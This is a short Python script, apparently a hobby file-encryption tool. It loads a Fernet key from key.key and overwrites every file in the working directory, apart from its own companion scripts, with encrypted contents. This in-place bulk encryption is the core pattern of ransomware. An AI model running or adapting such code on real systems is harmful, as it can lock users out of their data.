from cryptography.fernet import Fernet
import os
import time

key_file = open('key.key' , 'rb')
key = key_file.read()
key_file.close()

f = Fernet(key)

files = []

for fi in os.listdir():
    if os.path.isfile(fi):
        files.append(fi)

print(files)

remove_file = ['encrypt.py' , 'decrypt.py', 'key.key' , 'keygen.py']

for i in remove_file:
    files.remove(i)

for file in files:
    read_file =  open(file , 'rb')
    data = read_file.read()
    encrypt_data = f.encrypt(data)
    read_file.close()
    write_file = open(file , 'wb')
    write_file.write(encrypt_data)
    write_file.close()
    print(f'{file} is encryted sucessfully !')
    time.sleep(0.5)


